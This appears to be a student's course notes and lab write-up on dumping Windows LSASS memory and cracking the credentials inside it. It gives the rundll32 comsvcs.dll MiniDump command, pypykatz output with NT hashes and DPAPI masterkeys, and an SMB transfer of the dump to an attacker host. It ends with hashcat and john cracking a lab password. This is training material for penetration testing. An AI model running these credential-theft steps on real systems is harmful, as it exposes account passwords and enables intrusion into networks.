# Attacking LSASS

In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service). As covered in the `Credential Storage` section of this module, LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory

### Dumping LSASS process memory

Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump, so let's cover techniques that can be performed using tools already built into Windows.

#### **Task Manager method**

With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

<figure><img src="../../../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>

A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host. We can use the file transfer method discussed in the previous section of this module to transfer the dump file to our attack host.

### **Finding LSASS's PID in cmd**

From cmd, we can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.

```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

### **Finding LSASS's PID in PowerShell**

From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.

```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Once we have the PID assigned to the LSASS process, we can create a dump file.

### **Creating a dump file using PowerShell**

With an elevated PowerShell session, we can issue the following command to create a dump file:

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

If we manage to run this command and generate the `lsass.dmp` file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.

> Note: We can use the file transfer method discussed in the Attacking SAM section to get the lsass.dmp file from the target to our attack host.

### **Running Pypykatz**

The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of the `Local Security Authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file stored on our attack host. Pypykatz parses the dump file and outputs the findings:

```shell-session
eldeim@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

Lets take a more detailed look at some of the useful information in the output.

### **MSV**

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the next step of our attack covered at the end of this section.

### **WDIGEST**

```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update [here](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).

### **Kerberos**

```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

### **DPAPI**

```shell-session
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) module.

### **Cracking the NT Hash with Hashcat**

We can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.

```shell-session
eldeim@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

***

### Lab - Questions

* What is the name of the executable file associated with the Local Security Authority Process?

`lsass.exe`

* Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

> RDP to 10.129.202.149 (ACADEMY-PWATTACKS-LSASS) with user "htb-student" and password "HTB\_@cademy\_stdnt!"

Fristly, connect via RDP to the machine victim -->

```
xfreerdp /v:10.129.202.149 /u:htb-student /p:HTB_@cademy_stdnt!
```

Once we are into the desktop go to the task manager and sear by "Local Security Authority Process" and duplicate the lsass.DMP

<figure><img src="../../../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>

Now, weak up in my linex a SMB server an upload from cmd in windows the lsass file -->

```
### My kali
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData .

### Win
C:\Users\HTB-ST~1\AppData\Local\Temp> copy C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.dmp \\10.10.14.192\CompData\         
      1 file(s) copied.  
```

Now we have it, we preceed to read the hash -->

```
pypykatz lsa minidump /home/htb-ac-489480/lsass.DMP 

INFO:pypykatz:Parsing file /home/htb-ac-489480/lsass.DMP
FILE: ======== /home/htb-ac-489480/lsass.DMP =======
== LogonSession ==
authentication_id 334390 (51a36)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2025-11-24T22:44:32.015506+00:00
sid S-1-5-90-0-2
luid 334390
	== WDIGEST [51a36]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [51a36]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 124486 (1e646)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2025-11-24T22:41:19.437670+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 124486
	== MSV ==
		Username: Vendor
		Domain: FS01
		LM: NA
		NT: 31f87811133bc6aaa75a536e77f64314
		SHA1: 2b1c560c35923a8936263770a047764d0422caba
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [1e646]==
		username Vendor
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: Vendor
		Domain: FS01
	== WDIGEST [1e646]==
		username Vendor
		domainname FS01
		password None
		password (hex)

== LogonSession ==
authentication_id 334431 (51a5f)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2025-11-24T22:44:32.015506+00:00
sid S-1-5-90-0-2
luid 334431
	== WDIGEST [51a5f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [51a5f]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 42612 (a674)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2025-11-24T22:41:18.281132+00:00
sid S-1-5-96-0-1
luid 42612
	== WDIGEST [a674]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [a674]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 42564 (a644)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2025-11-24T22:41:18.281132+00:00
sid S-1-5-96-0-0
luid 42564
	== WDIGEST [a644]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [a644]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username FS01$
domainname WORKGROUP
logon_server 
logon_time 2025-11-24T22:41:18.062528+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== Kerberos ==
		Username: fs01$
		Domain: WORKGROUP
	== WDIGEST [3e7]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 7a4c5806-cde2-4e33-bb8e-a7988d928856
		masterkey 3036713f3ccfde362f57050b050289413347b9063264743b01c65e4143c6806512ece05c708b934afe48cd5b8cfe88de125d6208bbe048bd3fb83838adf2946e
		sha1_masterkey 6c3046d0bc927cdfd9b4503c6115034018dbddd1
	== DPAPI [3e7]==
		luid 999
		key_guid c8df280b-37fe-40d6-aa27-c7397815f5de
		masterkey e54f469728c73ebcac56e146d3c1ce063821738f07828bb912bc8b3683f3a7b4e18371a61759efd8e7bea5d0c058b478e2df86d5071abdaf16d587756cdbf69f
		sha1_masterkey bc3fb3fa95ea7372d4ea11683b8adcfe7b059c60
	== DPAPI [3e7]==
		luid 999
		key_guid 0c1b6c0a-191d-4839-8cf5-22ca4c3e5880
		masterkey dccd4056a5b0cc8211193669e6aea7755eeccd393adf0e5efa1f2a571c96039a7dbe05c9082c44f85b3080bb908eb41fb9f860174cd365e655f3d5788d5a8427
		sha1_masterkey efddd94b4348303e90c8d7285e8b65738196dc86
	== DPAPI [3e7]==
		luid 999
		key_guid 0453985c-7220-49f4-b024-79acf0de7874
		masterkey aaf3cdd36cf0d10871efd0d78a527664afc58078e84d49734f372fbb09e209538f606e0c5f0481b9f4d6ac6efb9a3631f16e38737a1b3cc15d0db42b63ebc90e
		sha1_masterkey 1d77f450edb6c76d14838b5b351672f35eec615f
	== DPAPI [3e7]==
		luid 999
		key_guid c19ecbf1-ea92-487e-a2d4-419f60a62360
		masterkey 387a060baf6887038b7ff133cd0eb4712ecdf531c16030a82395db368e6b2cda563dd026ccb815e1fb85215281a5437f085e3a5ca47fe9038e7e072f46270d74
		sha1_masterkey 5b07ca8e21e100937af4ab6d3f2482c745245436
	== DPAPI [3e7]==
		luid 999
		key_guid 6c61536b-7453-4ffa-911b-693858aef0c9
		masterkey 0c5f662bf8f65c75b773e4698606db1e2e387ad18a9c4fdee25e0dbac6eb7c04e04874d1910aba465ef3380a92b46231d7a781df2f5e38d2621e06c7476b222f
		sha1_masterkey cbabadd23d93b47ec94ac604ac91945135c5a097

== LogonSession ==
authentication_id 358817 (579a1)
session_id 2
username htb-student
domainname FS01
logon_server FS01
logon_time 2025-11-24T22:44:33.015601+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 358817
	== MSV ==
		Username: htb-student
		Domain: FS01
		LM: NA
		NT: 3c0e5d303ec84884ad5c3b7876a06ea6
		SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [579a1]==
		username htb-student
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: htb-student
		Domain: FS01
	== WDIGEST [579a1]==
		username htb-student
		domainname FS01
		password None
		password (hex)

== LogonSession ==
authentication_id 329535 (5073f)
session_id 0
username htb-student
domainname FS01
logon_server FS01
logon_time 2025-11-24T22:44:30.468703+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 329535

== LogonSession ==
authentication_id 72738 (11c22)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2025-11-24T22:41:18.609276+00:00
sid S-1-5-90-0-1
luid 72738
	== WDIGEST [11c22]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [11c22]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username FS01$
domainname WORKGROUP
logon_server 
logon_time 2025-11-24T22:41:18.406136+00:00
sid S-1-5-20
luid 996
	== WDIGEST [3e4]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== Kerberos ==
		Username: fs01$
		Domain: WORKGROUP
	== WDIGEST [3e4]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 358846 (579be)
session_id 2
username htb-student
domainname FS01
logon_server FS01
logon_time 2025-11-24T22:44:33.015601+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 358846
	== MSV ==
		Username: htb-student
		Domain: FS01
		LM: NA
		NT: 3c0e5d303ec84884ad5c3b7876a06ea6
		SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [579be]==
		username htb-student
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: htb-student
		Domain: FS01
	== WDIGEST [579be]==
		username htb-student
		domainname FS01
		password None
		password (hex)
	== DPAPI [579be]==
		luid 358846
		key_guid c75b5a96-7d80-4511-8bb8-474e3c09670f
		masterkey 12e8cc72d4d672d492fc8878c736aea970e11d74e87061fe779ce8884c9f0cb20cd0db541f95440ed8c4d527a91682fb7721ba397700932a49c8dbb7120cd2c8
		sha1_masterkey a34f57ba87672c43f091934906052ac4cf7364f7

== LogonSession ==
authentication_id 332246 (511d6)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2025-11-24T22:44:31.874902+00:00
sid S-1-5-96-0-2
luid 332246
	== WDIGEST [511d6]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [511d6]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2025-11-24T22:41:18.671768+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username: 
		Domain: 

== LogonSession ==
authentication_id 72711 (11c07)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2025-11-24T22:41:18.609276+00:00
sid S-1-5-90-0-1
luid 72711
	== WDIGEST [11c07]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [11c07]==
		username FS01$
		domainname WORKGROUP
		password None
		password (hex)

== LogonSession ==
authentication_id 41459 (a1f3)
session_id 0
username 
domainname 
logon_server 
logon_time 2025-11-24T22:41:18.124906+00:00
sid None
luid 41459

```

<figure><img src="../../../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>

Copy the hash and save it to proceed of crack -->

```
echo 'Vendor:31f87811133bc6aaa75a536e77f64314' > vendor.hash
```

```
john vendor.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=nt
Mic@123          (Vendor)  
```
